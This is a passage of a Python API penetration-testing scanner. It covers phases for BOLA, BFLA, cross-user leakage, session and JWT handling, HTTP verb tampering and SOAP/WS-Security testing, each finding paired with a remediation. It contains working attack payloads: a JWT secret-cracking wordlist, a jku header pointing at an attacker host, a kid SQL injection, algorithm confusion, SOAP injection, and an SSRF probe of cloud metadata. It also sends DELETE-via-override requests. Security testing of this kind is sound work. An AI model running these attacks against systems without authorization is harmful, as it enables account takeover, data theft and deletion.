                                               test_data.get("userId"))
                                    if resp_id and str(resp_id) != str(own_id):
                                        output.add_finding(
                                            phase="bola",
                                            title="Broken Object Level Authorization (IDOR / BOLA)",
                                            severity="CRITICAL",
                                            url=test_url,
                                            detail="The application or API exposes user-controlled object identifiers and does not verify whether the authenticated user has authorisation to access the referenced object, enabling horizontal privilege escalation.",
                                            evidence=f"Own ID: {own_id}, accessed ID: {test_id}",
                                            remediation="Enforce server-side authorisation checks for every object access request, verifying ownership or explicit permission before returning or modifying data; do not rely on obscure IDs as an access control mechanism.",
                                        )
                                except Exception:
                                    pass
                except Exception:
                    pass

    # Test ID enumeration on discovered ID endpoints
    for ep, param_ids in id_endpoints[:5]:
        if _shutdown_requested:
            break
        path_template = ep["path"]
        for param in param_ids[:1]:
            for test_id in ("1", "2", "3", "999999", "0"):
                if "{" + param + "}" in path_template:
                    test_path = path_template.replace("{" + param + "}", test_id)
                elif ":" + param in path_template:
                    test_path = path_template.replace(":" + param, test_id)
                else:
                    test_path = path_template

                url = root + test_path
                resp = _safe_get(auth_sess, url, timeout=timeout)
                if resp and resp.status_code == 200:
                    try:
                        data = resp.json()
                        resp_id = (data.get("id") or data.get("user_id") or
                                   data.get("userId") or data.get("_id"))
                        if resp_id and str(resp_id) != test_id:
                            output.add_finding(
                                phase="bola",
                                title="BOLA — Object Enumeration Possible",
                                severity="HIGH",
                                url=url,
                                detail=(f"Endpoint returns object with different ID than requested. "
                                        f"Requested {test_id}, got {resp_id}."),
                                evidence=f"Path: {test_path}, response id: {resp_id}",
                                remediation="Validate that the returned object belongs to the requester.",
                            )
                            break
                    except Exception:
                        pass

    con.status("bola", "done", "BOLA testing complete")


# ---------------------------------------------------------------------------
# Phase 11: BFLA
# ---------------------------------------------------------------------------

_ADMIN_PATHS = [
    "/admin",
    "/api/admin",
    "/management",
    "/api/management",
    "/admin/users",
    "/api/users",
    "/api/admin/users",
    "/internal",
    "/api/internal",
    "/debug",
    "/api/debug",
    "/api/settings",
    "/api/config",
    "/api/roles",
    "/api/permissions",
    "/superadmin",
    "/api/superadmin",
    "/api/audit",
    "/api/logs",
]


def phase_bfla(settings: dict, auth_sess, output: OutputManager,
               inventory: list) -> None:
    """Phase 11: BFLA — function-level authorization bypass."""
    if auth_sess is None:
        con.status("bfla", "skip", "Auth session required")
        return

    scan = settings["scan"]
    base_url = scan["api_base_url"]
    timeout = scan.get("timeout", 10)
    target = _parse_target(base_url)
    root = f"{target['scheme']}://{target['netloc']}"

    con.status("bfla", "running", "Testing function-level authorization bypass")

    # Find admin-like paths in inventory
    admin_inventory = [ep for ep in inventory
                       if re.search(r'(admin|manage|internal|debug|config|settings|'
                                    r'audit|log|role|permission|superadmin)', ep["path"], re.I)]

    # Also probe hardcoded admin paths
    test_paths = list({ep["path"] for ep in admin_inventory})
    test_paths += _ADMIN_PATHS

    found_bfla = False
    for path in test_paths[:25]:
        if _shutdown_requested:
            break
        url = root + path
        resp = _safe_get(auth_sess, url, timeout=timeout)
        if resp and resp.status_code in (200, 201):
            try:
                data = resp.json()
                # Check if response looks like admin data
                keys = _extract_json_keys(data)
                admin_indicators = any(
                    re.search(r'(user.*list|all.*user|admin|role|permission|config|setting)',
                              k, re.I)
                    for k in keys
                )
                if admin_indicators or (isinstance(data, list) and len(data) > 1):
                    output.add_finding(
                        phase="bfla",
                        title="BFLA — Broken Function Level Authorization",
                        severity="CRITICAL",
                        url=url,
                        detail=(f"Regular user can access privileged endpoint: {path}"),
                        evidence=f"HTTP {resp.status_code}, response keys: {keys[:5]}",
                        remediation=(
                            "Implement role-based access control; "
                            "verify user role on every function call."
                        ),
                    )
                    found_bfla = True
            except Exception:
                # Non-JSON 200 on admin path
                if len(resp.text) > 100:
                    output.add_finding(
                        phase="bfla",
                        title="BFLA — Admin Endpoint Accessible",
                        severity="HIGH",
                        url=url,
                        detail=f"Admin-like endpoint returns HTTP 200 for regular user: {path}",
                        evidence=f"HTTP {resp.status_code}: {resp.text[:200]}",
                        remediation="Enforce authorization checks on all admin endpoints.",
                    )

    if not found_bfla:
        con.info("No BFLA vulnerabilities detected")

    con.status("bfla", "done", "BFLA testing complete")


# ---------------------------------------------------------------------------
# Phase 12: Cross-User Data Leakage
# ---------------------------------------------------------------------------

def phase_cross_user(settings: dict, auth_sess, auth2_sess,
                     output: OutputManager, inventory: list) -> None:
    """Phase 12: Cross-user data leakage testing."""
    if auth_sess is None or auth2_sess is None:
        con.status("cross_user", "skip", "Both auth and auth2 sessions required")
        return

    scan = settings["scan"]
    base_url = scan["api_base_url"]
    timeout = scan.get("timeout", 10)
    target = _parse_target(base_url)
    root = f"{target['scheme']}://{target['netloc']}"

    con.status("cross_user", "running", "Testing cross-user data leakage")

    # Get user1 identity
    user1_id = None
    user1_resources: dict = {}
    me_paths = ["/me", "/user/me", "/users/me", "/profile", "/account", "/api/me"]

    for me_path in me_paths:
        url = root + me_path
        resp = _safe_get(auth_sess, url, timeout=timeout)
        if resp and resp.status_code == 200:
            try:
                data = resp.json()
                user1_id = (data.get("id") or data.get("user_id") or
                            data.get("userId") or data.get("_id"))
                if user1_id:
                    user1_resources["me"] = {"path": me_path, "data": data}
                    break
            except Exception:
                pass

    if not user1_id:
        con.info("Could not determine user1 identity for cross-user test")
        con.status("cross_user", "done", "Could not determine user identity")
        return

    con.info(f"User1 ID: {user1_id}")

    # Now try to access user1's resources as user2
    # Find GET endpoints with ID parameters
    id_endpoints = [ep for ep in inventory
                    if ep["method"] == "GET" and _extract_path_ids(ep["path"])]

    test_paths_to_try = [ep["path"] for ep in id_endpoints[:10]]
    # Also try generic user paths
    test_paths_to_try += [
        f"/users/{user1_id}",
        f"/api/users/{user1_id}",
        f"/user/{user1_id}",
        f"/accounts/{user1_id}",
        f"/profile/{user1_id}",
    ]

    for path in test_paths_to_try[:15]:
        if _shutdown_requested:
            break
        # Substitute user1_id into path templates
        test_path = path
        for param in _extract_path_ids(path):
            if "{" + param + "}" in test_path:
                test_path = test_path.replace("{" + param + "}", str(user1_id))
            elif ":" + param in test_path:
                test_path = test_path.replace(":" + param, str(user1_id))

        url = root + test_path
        resp = _safe_get(auth2_sess, url, timeout=timeout)
        if resp and resp.status_code == 200:
            try:
                data = resp.json()
                resp_id = (data.get("id") or data.get("user_id") or
                           data.get("userId") or data.get("_id"))
                if resp_id and str(resp_id) == str(user1_id):
                    output.add_finding(
                        phase="cross_user",
                        title="Cross-User Data Leakage",
                        severity="CRITICAL",
                        url=url,
                        detail=(f"User2 can access User1's data (ID {user1_id}) "
                                f"at {test_path}."),
                        evidence=f"User2 got user1 resource: {json.dumps(data)[:300]}",
                        remediation=(
                            "Enforce object-level authorization; "
                            "verify resource ownership on each request."
                        ),
                    )
            except Exception:
                pass

    con.status("cross_user", "done", "Cross-user leakage testing complete")


# ---------------------------------------------------------------------------
# Phase 13: Session / Token Management
# ---------------------------------------------------------------------------

def phase_session(settings: dict, auth_sess, output: OutputManager,
                  inventory: list) -> None:
    """Phase 13: API session and token management analysis."""
    if auth_sess is None:
        con.status("session", "skip", "Auth session required")
        return

    scan = settings["scan"]
    base_url = scan["api_base_url"]
    timeout = scan.get("timeout", 10)
    target = _parse_target(base_url)
    root = f"{target['scheme']}://{target['netloc']}"

    con.status("session", "running", "Analyzing session/token management")

    token = auth_sess.headers.get("Authorization", "")
    if token.startswith("Bearer "):
        raw_token = token[7:].strip()
        decoded = _jwt_decode_token(raw_token)

        if decoded:
            header, payload, _ = decoded

            # Check expiry
            if "exp" not in payload:
                output.add_finding(
                    phase="session",
                    title="JWT Missing Expiry Claim",
                    severity="MEDIUM",
                    url=base_url,
                    detail="JWT access token does not contain an 'exp' (expiration) claim.",
                    evidence=f"JWT payload: {json.dumps(payload)}",
                    remediation="Always include short-lived 'exp' claims in JWT tokens.",
                )

            # Check iat claim
            if "iat" not in payload:
                output.add_finding(
                    phase="session",
                    title="JWT Missing Issued-At Claim",
                    severity="LOW",
                    url=base_url,
                    detail="JWT does not contain an 'iat' (issued at) claim.",
                    evidence=f"JWT payload: {json.dumps(payload)}",
                    remediation="Include 'iat' claim for token auditing and refresh policy enforcement.",
                )

            # Check algorithm
            alg = header.get("alg", "")
            if alg.lower() in ("none", ""):
                output.add_finding(
                    phase="session",
                    title="JWT Uses Insecure Algorithm",
                    severity="CRITICAL",
                    url=base_url,
                    detail=f"JWT algorithm is '{alg}', which provides no security.",
                    evidence=f"JWT header: {json.dumps(header)}",
                    remediation="Use RS256 or HS256 with a strong secret.",
                )
            elif alg == "HS256":
                output.add_finding(
                    phase="session",
                    title="JWT Uses Symmetric Algorithm (HS256)",
                    severity="LOW",
                    url=base_url,
                    detail="HS256 requires sharing the secret key; RS256 is preferred for APIs.",
                    evidence=f"JWT alg: {alg}",
                    remediation="Consider RS256 asymmetric signing for better key management.",
                )

    # Check logout + replay
    logout_paths = ["/logout", "/api/logout", "/auth/logout", "/signout", "/api/signout"]
    logout_url = None
    for lp in logout_paths:
        url = root + lp
        resp = _safe_request(auth_sess, "POST", url, timeout=timeout)
        if resp and resp.status_code in (200, 204):
            logout_url = url
            break

    if logout_url:
        # Try to use the token after logout
        test_endpoints = [ep for ep in inventory if ep["method"] == "GET"][:3]
        for ep in test_endpoints:
            url = root + ep["path"]
            replay_resp = _safe_get(auth_sess, url, timeout=timeout)
            if replay_resp and replay_resp.status_code == 200:
                output.add_finding(
                    phase="session",
                    title="JWT Token Not Invalidated After Logout",
                    severity="HIGH",
                    url=url,
                    detail="Token remains valid after logout endpoint was called.",
                    evidence=f"POST {logout_url} -> 200, then GET {url} -> 200",
                    remediation=(
                        "Maintain a token denylist or use short-lived tokens with "
                        "refresh token rotation; invalidate tokens server-side on logout."
                    ),
                )
                break

    con.status("session", "done", "Session analysis complete")


# ---------------------------------------------------------------------------
# Phase 14: JWT Advanced Attacks
# ---------------------------------------------------------------------------

_JWT_WORDLIST = [
    "secret", "password", "123456", "jwt_secret", "api_key",
    "changeme", "mysecret", "token", "jwt", "supersecret",
    "test", "dev", "key", "private", "hs256", "default",
    "qwerty", "letmein", "admin", "root", "pass", "master",
    "access", "verify", "sign", "itsasecret", "shhhh",
    "hello", "world", "app_secret", "flask_secret", "django_secret",
]


def phase_jwt(settings: dict, auth_sess, output: OutputManager,
              inventory: list) -> None:
    """Phase 14: JWT advanced attacks."""
    if auth_sess is None:
        con.status("jwt", "skip", "Auth session required")
        return

    scan = settings["scan"]
    base_url = scan["api_base_url"]
    timeout = scan.get("timeout", 10)
    target = _parse_target(base_url)
    root = f"{target['scheme']}://{target['netloc']}"

    con.status("jwt", "running", "Running advanced JWT attack suite")

    token_hdr = auth_sess.headers.get("Authorization", "")
    if not token_hdr.startswith("Bearer "):
        con.status("jwt", "skip", "No Bearer token in auth session")
        return

    raw_token = token_hdr[7:].strip()
    decoded = _jwt_decode_token(raw_token)
    if not decoded:
        con.status("jwt", "skip", "Could not decode token as JWT")
        return

    header, payload, signature = decoded

    # Find a protected endpoint to probe
    test_endpoints = ([ep for ep in inventory if ep.get("auth_required")] or
                      inventory[:3])
    probe_url = (root + test_endpoints[0]["path"]) if test_endpoints else base_url

    # 1. HMAC secret brute force (expanded wordlist)
    jwt_secret_cfg = scan.get("jwt_secret", "")
    wordlist = list(_JWT_WORDLIST)
    if jwt_secret_cfg:
        wordlist.insert(0, jwt_secret_cfg)

    cracked_secret = None
    for secret in wordlist:
        forged = _jwt_forge_hs256(raw_token, secret)
        if not forged:
            continue
        test_sess = _make_session(settings)
        test_sess.headers["Authorization"] = f"Bearer {forged}"
        resp = _safe_get(test_sess, probe_url, timeout=timeout)
        if resp and resp.status_code in (200, 201):
            cracked_secret = secret
            output.add_finding(
                phase="jwt",
                title="JWT HMAC Secret Cracked",
                severity="CRITICAL",
                url=probe_url,
                detail=f"JWT was re-signed with cracked secret '{secret}' and accepted by server.",
                evidence=f"Cracked secret: '{secret}'",
                remediation="Replace JWT secret with a cryptographically random 256-bit key.",
            )
            break

    # 2. jku / x5u injection
    try:
        new_header = dict(header)
        new_header["jku"] = "https://attacker.example.com/jwks.json"
        new_header.pop("x5u", None)
        h = _b64url_encode(json.dumps(new_header, separators=(",", ":")).encode())
        p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
        injected_token = f"{h}.{p}."
        test_sess = _make_session(settings)
        test_sess.headers["Authorization"] = f"Bearer {injected_token}"
        resp = _safe_get(test_sess, probe_url, timeout=timeout)
        if resp and resp.status_code in (200, 201):
            output.add_finding(
                phase="jwt",
                title="JWT — jku/x5u Header Injection (JWKS Spoofing)",
                severity="CRITICAL",
                url=probe_url,
                detail="Server fetched and trusted JWK set from attacker-controlled jku header URL.",
                evidence="Token with injected jku accepted by server",
                remediation="Never trust the jku/x5u header; pin the JWKS endpoint server-side.",
            )
    except Exception:
        pass

    # 3. kid header SQL injection — inject even when current token has no kid
    try:
        new_header = dict(header)
        new_header["kid"] = "' UNION SELECT 'attackerkey'--"
        h = _b64url_encode(json.dumps(new_header, separators=(",", ":")).encode())
        p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
        sig = hmac.new(b"attackerkey", f"{h}.{p}".encode(), hashlib.sha256).digest()
        injected_token = f"{h}.{p}.{_b64url_encode(sig)}"
        test_sess = _make_session(settings)
        test_sess.headers["Authorization"] = f"Bearer {injected_token}"
        resp = _safe_get(test_sess, probe_url, timeout=timeout)
        if resp and resp.status_code in (200, 201):
            output.add_finding(
                phase="jwt",
                title="JWT — kid Header SQL Injection",
                severity="CRITICAL",
                url=probe_url,
                detail="SQL injection payload in JWT kid header was accepted by server.",
                evidence="kid SQL-injected token accepted",
                remediation="Validate and sanitize the kid header; use parameterized key lookups.",
            )
    except Exception:
        pass

    # 4. Algorithm confusion: try HS256 with public key as secret
    # (if alg is RS256 or ES256, try signing with HS256)
    if header.get("alg", "").startswith("RS"):
        # Try sending an HS256 token (public key as secret is empty here)
        try:
            new_header = dict(header)
            new_header["alg"] = "HS256"
            h = _b64url_encode(json.dumps(new_header, separators=(",", ":")).encode())
            p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
            # Use empty key (public key not available in automated scan)
            sig = hmac.new(b"", f"{h}.{p}".encode(), hashlib.sha256).digest()
            injected_token = f"{h}.{p}.{_b64url_encode(sig)}"
            test_sess = _make_session(settings)
            test_sess.headers["Authorization"] = f"Bearer {injected_token}"
            resp = _safe_get(test_sess, probe_url, timeout=timeout)
            if resp and resp.status_code in (200, 201):
                output.add_finding(
                    phase="jwt",
                    title="JWT Algorithm Confusion Attack (RS256 → HS256)",
                    severity="CRITICAL",
                    url=probe_url,
                    detail="Server accepted HS256 token when RS256 was expected (algorithm confusion).",
                    evidence="Downgraded RS256 → HS256 token accepted",
                    remediation="Enforce expected algorithm server-side; reject algorithm downgrades.",
                )
        except Exception:
            pass

    con.status("jwt", "done", "JWT advanced testing complete")


# ---------------------------------------------------------------------------
# Phase 17: HTTP Verb Tampering / Method Override
# ---------------------------------------------------------------------------

def phase_verb_tampering(settings: dict, sess: requests.Session,
                         auth_sess, output: OutputManager,
                         inventory: list) -> None:
    """Phase 17: HTTP verb tampering via method override headers."""
    scan     = settings["scan"]
    base_url = scan["api_base_url"]
    timeout  = scan.get("timeout", 10)
    target   = _parse_target(base_url)
    root     = f"{target['scheme']}://{target['netloc']}"

    con.status("verb_tampering", "running", "HTTP method override header testing")

    test_sess = auth_sess if auth_sess else sess

    _override_headers = [
        "X-HTTP-Method-Override",
        "X-Method-Override",
        "X-HTTP-Method",
        "_method",
    ]
    _override_methods = ["DELETE", "PUT", "PATCH", "OPTIONS"]

    # Focus on GET endpoints — probe if override headers tunnel other methods
    get_endpoints = [ep for ep in inventory[:30] if ep.get("method", "").upper() == "GET"]
    if not get_endpoints:
        get_endpoints = [{"path": "/api/v1", "method": "GET", "params": [], "body_fields": []}]

    for ep in get_endpoints:
        if _shutdown_requested:
            break
        path       = ep["path"]
        probe_path = re.sub(r'\{[^}]+\}|:\w+', '1', path)
        ep_url     = root + probe_path

        # Baseline GET
        try:
            baseline = test_sess.get(ep_url, timeout=timeout, allow_redirects=False)
        except Exception:
            continue
        if baseline is None:
            continue
        baseline_code = baseline.status_code

        for override_hdr in _override_headers:
            if _shutdown_requested:
                break
            for override_method in _override_methods:
                try:
                    r = test_sess.get(
                        ep_url,
                        headers={override_hdr: override_method},
                        timeout=timeout,
                        allow_redirects=False,
                    )
                    if r is None:
                        continue
                    # Interesting: different status code than baseline GET, especially 2xx or 4xx auth
                    if r.status_code != baseline_code and r.status_code not in (400, 404, 405, 501):
                        sev = "HIGH" if r.status_code in (200, 201, 204) else "MEDIUM"
                        output.add_finding(
                            phase="verb_tampering",
                            title=f"HTTP Method Override Accepted — {override_method} via {override_hdr}",
                            severity=sev,
                            url=ep_url,
                            detail=(
                                f"Sending GET {path} with header '{override_hdr}: {override_method}' "
                                f"returned HTTP {r.status_code} (baseline GET was {baseline_code}). "
                                "The server may be processing the overridden method, allowing "
                                "attackers to bypass firewall or WAF rules that restrict HTTP methods."
                            ),
                            evidence=(
                                f"GET {ep_url} {override_hdr}: {override_method} → HTTP {r.status_code}\n"
                                f"Baseline GET → HTTP {baseline_code}"
                            ),
                            remediation=(
                                "Do not trust X-HTTP-Method-Override or similar headers unless "
                                "there is a specific verified need. Apply the same authorization and "
                                "rate-limiting controls regardless of how the HTTP method is specified."
                            ),
                            extra={"owasp": "API6:2023 Unrestricted Access to Sensitive Business Flows",
                                   "nist": "AC-3"},
                        )
                        con.log(f"[verb_tampering] {override_hdr}={override_method} on {ep_url} → {r.status_code}", "SUCCESS")
                except Exception:
                    pass

    # Also probe common write endpoints with POST + override header to reach DELETE/PUT
    _write_paths = ["/api/v1/users/1", "/api/v1/items/1", "/api/users/1", "/api/items/1"]
    for wp in _write_paths:
        if _shutdown_requested:
            break
        wp_url = root + wp
        for override_hdr in _override_headers[:2]:
            try:
                r = test_sess.post(
                    wp_url,
                    headers={override_hdr: "DELETE"},
                    json={},
                    timeout=timeout,
                    allow_redirects=False,
                )
                if r is not None and r.status_code in (200, 204):
                    output.add_finding(
                        phase="verb_tampering",
                        title="HTTP Method Override — DELETE via POST Accepted",
                        severity="HIGH",
                        url=wp_url,
                        detail=(
                            f"POST {wp} with '{override_hdr}: DELETE' returned HTTP {r.status_code}. "
                            "An attacker may be able to delete arbitrary resources by tunnelling DELETE "
                            "through POST requests."
                        ),
                        evidence=f"POST {wp_url} {override_hdr}: DELETE → HTTP {r.status_code}",
                        remediation=(
                            "Reject or ignore HTTP method override headers. "
                            "Enforce authorization at the resource and method level independently."
                        ),
                        extra={"owasp": "API5:2023 Broken Function Level Authorization",
                               "nist": "AC-3"},
                    )
                    con.log(f"[verb_tampering] DELETE-via-POST accepted on {wp_url}", "SUCCESS")
            except Exception:
                pass

    con.status("verb_tampering", "done", "Verb tampering testing complete")


# ---------------------------------------------------------------------------
# Phase 18: SOAP / WS-Security Testing
# ---------------------------------------------------------------------------

def phase_soap(settings: dict, sess: requests.Session,
               output: OutputManager) -> None:
    """Phase 18: SOAP and WS-Security testing."""
    scan     = settings["scan"]
    base_url = scan["api_base_url"]
    timeout  = scan.get("timeout", 10)
    target   = _parse_target(base_url)
    root     = f"{target['scheme']}://{target['netloc']}"

    con.status("soap", "running", "WSDL enumeration")

    # 1. WSDL enumeration — discover operations and types
    _wsdl_paths = [
        "/?wsdl", "/?WSDL", "/wsdl", "/service.wsdl", "/api.wsdl",
        "/ws?wsdl", "/soap?wsdl", "/soap/wsdl", "/services?wsdl",
    ]
    wsdl_url    = None
    wsdl_body   = ""
    _wsdl_re    = re.compile(r'<wsdl:|<definitions\s|xmlns.*wsdl|<portType|<binding\s', re.I)
    _op_re      = re.compile(r'<(?:wsdl:)?operation\s+name="([^"]+)"', re.I)

    for wp in _wsdl_paths:
        if _shutdown_requested:
            break
        wurl = root + wp if not wp.startswith("http") else wp
        wr = _safe_get(sess, wurl, timeout=timeout)
        if wr is not None and wr.status_code == 200 and _wsdl_re.search(wr.text[:2000]):
            wsdl_url  = wurl
            wsdl_body = wr.text
            operations = _op_re.findall(wsdl_body)
            output.add_finding(
                phase="soap",
                title="WSDL Enumeration — Service Definition Exposed",
                severity="MEDIUM",
                url=wurl,
                detail=(
                    f"The WSDL service definition is publicly accessible at {wurl}. "
                    f"Operations discovered: {', '.join(operations[:20]) if operations else 'unknown'}. "
                    "Exposed WSDL documents reveal service structure, operation names, and data types "
                    "which aid targeted exploitation."
                ),
                evidence=f"HTTP {wr.status_code}; operations found: {len(operations)}; excerpt: {wsdl_body[:300]}",
                remediation=(
                    "Restrict WSDL access to authorized clients only. "
                    "Require authentication before serving the WSDL document. "
                    "Review all exposed operations for unnecessary exposure."
                ),
                extra={"owasp": "API9:2023 Improper Inventory Management", "nist": "CM-7"},
            )
            con.log(f"[soap] WSDL found at {wurl}: {len(operations)} operations", "SUCCESS")
            break

    # 2. SOAPAction header spoofing
    con.status("soap", "running", "SOAPAction header spoofing")
    _soap_endpoints = [root + p for p in ["/soap", "/ws", "/services", "/api/soap", "/webservice"]]
    if wsdl_url:
        _soap_endpoints.insert(0, wsdl_url.split("?")[0])

    _soap_spoof_actions = [
        "urn:admin", "urn:AdminService#getUsers", "#getUsers",
        "http://schemas.xmlsoap.org/soap/envelope/", "",
    ]
    _soap_envelope = (
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">'
        '<soapenv:Header/>'
        '<soapenv:Body><req xmlns="urn:test"><param>siphon_soap_probe</param></req></soapenv:Body>'
        '</soapenv:Envelope>'
    )
    _soap_err_re = re.compile(
        r'<faultstring>|<faultcode>|soap:Fault|soapenv:Fault|'
        r'NullPointerException|ClassCastException|stack trace',
        re.I
    )

    for sep in _soap_endpoints[:3]:
        if _shutdown_requested:
            break
        for spoof_action in _soap_spoof_actions[:3]:
            try:
                r = sess.post(
                    sep,
                    data=_soap_envelope.encode("utf-8"),
                    headers={
                        "Content-Type": "text/xml; charset=UTF-8",
                        "SOAPAction":   f'"{spoof_action}"',
                    },
                    timeout=timeout,
                    allow_redirects=False,
                )
                if r is not None and r.status_code in (200, 500):
                    body_snip = r.text[:500]
                    if _soap_err_re.search(body_snip):
                        output.add_finding(
                            phase="soap",
                            title="SOAP Verbose Fault / Error Disclosure",
                            severity="MEDIUM",
                            url=sep,
                            detail=(
                                f"The SOAP endpoint returned a verbose fault response with SOAPAction "
                                f"'{spoof_action}'. Verbose SOAP faults disclose server-side implementation "
                                "details, stack traces, and class names."
                            ),
                            evidence=f"SOAPAction: {spoof_action!r} → HTTP {r.status_code}; {body_snip[:300]}",
                            remediation=(
                                "Return generic fault messages in production. "
                                "Log full error details server-side only."
                            ),
                            extra={"owasp": "API8:2023 Security Misconfiguration", "nist": "SI-11"},
                        )
                        con.log(f"[soap] Verbose fault at {sep} SOAPAction={spoof_action!r}", "SUCCESS")
                        break
            except Exception:
                pass

    # 3. WS-Security bypass — expired timestamp, empty PasswordDigest
    con.status("soap", "running", "WS-Security bypass testing")
    _wsse_expired_envelope = (
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" '
        'xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd" '
        'xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd">'
        '<soapenv:Header>'
        '<wsse:Security>'
        '<wsu:Timestamp><wsu:Created>2000-01-01T00:00:00Z</wsu:Created>'
        '<wsu:Expires>2000-01-01T00:05:00Z</wsu:Expires></wsu:Timestamp>'
        '<wsse:UsernameToken>'
        '<wsse:Username>admin</wsse:Username>'
        '<wsse:Password Type="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-username-token-profile-1.0#PasswordDigest"></wsse:Password>'
        '</wsse:UsernameToken>'
        '</wsse:Security>'
        '</soapenv:Header>'
        '<soapenv:Body><req xmlns="urn:test"><param>siphon_wsse_probe</param></req></soapenv:Body>'
        '</soapenv:Envelope>'
    )
    for sep in _soap_endpoints[:2]:
        if _shutdown_requested:
            break
        try:
            r = sess.post(
                sep,
                data=_wsse_expired_envelope.encode("utf-8"),
                headers={"Content-Type": "text/xml; charset=UTF-8", "SOAPAction": '""'},
                timeout=timeout,
                allow_redirects=False,
            )
            if r is not None and r.status_code == 200:
                if "siphon_wsse_probe" in r.text or ("Fault" not in r.text and len(r.text) > 50):
                    output.add_finding(
                        phase="soap",
                        title="WS-Security Bypass — Expired Timestamp / Empty PasswordDigest Accepted",
                        severity="HIGH",
                        url=sep,
                        detail=(
                            "The SOAP endpoint accepted a WS-Security token with an expired timestamp "
                            "(year 2000) and an empty PasswordDigest without returning a fault. "
                            "This suggests WS-Security validation is disabled or misconfigured, allowing "
                            "authentication bypass."
                        ),
                        evidence=f"HTTP {r.status_code}; response[:300]: {r.text[:300]}",
                        remediation=(
                            "Enforce WS-Security timestamp validation with a max skew of 5 minutes. "
                            "Reject requests with missing or invalid PasswordDigest. "
                            "Enable UsernameToken authentication validation."
                        ),
                        extra={"owasp": "API2:2023 Broken Authentication", "nist": "IA-3"},
                    )
                    con.log(f"[soap] WS-Security bypass at {sep}", "SUCCESS")
                    break
        except Exception:
            pass

    # 4. SOAP injection via string parameters
    con.status("soap", "running", "SOAP injection testing")
    _soap_inject_payloads = [
        ("</param><injected>siphon_soap_inject</injected><param>",
         re.compile(r'siphon_soap_inject', re.I)),
        ("' or '1'='1",
         re.compile(r'siphon_soap_inject|sql.*error|ORA-|SQLSTATE|syntax.*error', re.I)),
    ]
    _soap_inject_envelope_tpl = (
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">'
        '<soapenv:Header/>'
        '<soapenv:Body><req xmlns="urn:test"><param>{PAYLOAD}</param></req></soapenv:Body>'
        '</soapenv:Envelope>'
    )
    for sep in _soap_endpoints[:2]:
        if _shutdown_requested:
            break
        for payload, sig_re in _soap_inject_payloads:
            try:
                body = _soap_inject_envelope_tpl.replace("{PAYLOAD}", payload)
                r = sess.post(
                    sep,
                    data=body.encode("utf-8"),
                    headers={"Content-Type": "text/xml; charset=UTF-8", "SOAPAction": '""'},
                    timeout=timeout,
                    allow_redirects=False,
                )
                if r is not None and r.status_code in (200, 500) and sig_re.search(r.text):
                    output.add_finding(
                        phase="soap",
                        title="SOAP Injection — Parameter Reflected or Error Triggered",
                        severity="HIGH",
                        url=sep,
                        detail=(
                            f"A SOAP injection payload was accepted and produced a detectable response. "
                            f"Payload: {payload[:80]!r}. This may indicate XML injection or SQL injection "
                            "within SOAP message processing."
                        ),
                        evidence=f"Payload: {payload[:80]!r} → HTTP {r.status_code}; {r.text[:300]}",
                        remediation=(
                            "Validate and sanitize all SOAP parameter values server-side. "
                            "Use schema validation (XSD) for all incoming SOAP messages. "
                            "Use parameterized queries to prevent SQL injection via SOAP parameters."
                        ),
                        extra={"owasp": "API8:2023 Security Misconfiguration", "nist": "SI-10"},
                    )
                    con.log(f"[soap] SOAP injection at {sep}: {payload[:40]!r}", "SUCCESS")
                    break
            except Exception:
                pass

    # 5. WS-Addressing header injection (ReplyTo/FaultTo)
    con.status("soap", "running", "WS-Addressing header injection")
    _wsa_envelope = (
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" '
        'xmlns:wsa="http://www.w3.org/2005/08/addressing">'
        '<soapenv:Header>'
        '<wsa:ReplyTo><wsa:Address>http://169.254.169.254/latest/meta-data/</wsa:Address></wsa:ReplyTo>'
        '<wsa:FaultTo><wsa:Address>http://169.254.169.254/latest/meta-data/</wsa:Address></wsa:FaultTo>'
        '<wsa:To>{ENDPOINT}</wsa:To>'
        '<wsa:Action>urn:probe</wsa:Action>'
        '</soapenv:Header>'
        '<soapenv:Body><req xmlns="urn:test"><param>siphon_wsa_probe</param></req></soapenv:Body>'
        '</soapenv:Envelope>'
    )
    for sep in _soap_endpoints[:2]:
        if _shutdown_requested:
            break
        try:
            body = _wsa_envelope.replace("{ENDPOINT}", sep)
            r = sess.post(
                sep,
                data=body.encode("utf-8"),
                headers={"Content-Type": "text/xml; charset=UTF-8", "SOAPAction": '""'},
                timeout=timeout,
                allow_redirects=False,
            )
            # 202 Accepted without immediate response body = async callback dispatched
            if r is not None and r.status_code in (200, 202):
                if r.status_code == 202 or len(r.text) < 100:
                    output.add_finding(
                        phase="soap",
                        title="WS-Addressing ReplyTo/FaultTo Header Accepted (SSRF Risk)",
                        severity="HIGH",
                        url=sep,
                        detail=(
                            "The SOAP endpoint accepted WS-Addressing headers with an internal "
                            "IP (169.254.169.254 — AWS metadata) in ReplyTo/FaultTo and returned "
                            f"HTTP {r.status_code} without rejecting the address. "
                            "If the server dispatches asynchronous callbacks to those addresses, "
                            "this is a blind SSRF vulnerability."
                        ),
                        evidence=f"WS-Addressing ReplyTo: 169.254.169.254 → HTTP {r.status_code}",
                        remediation=(
                            "Validate WS-Addressing ReplyTo and FaultTo addresses against an allowlist. "
                            "Block private IP ranges and cloud metadata endpoints."
                        ),
                        extra={"owasp": "API7:2023 Server Side Request Forgery", "nist": "SI-10"},
                    )
                    con.log(f"[soap] WS-Addressing SSRF candidate at {sep}", "SUCCESS")
                    break
        except Exception:
            pass

    con.status("soap", "done", "SOAP testing complete")


# ---------------------------------------------------------------------------
# Phase 19: File Upload Endpoint Detection (Informational)
# ---------------------------------------------------------------------------

def phase_file_upload_info(settings: dict, sess: requests.Session,
                           auth_sess, output: OutputManager,
                           inventory: list) -> None:
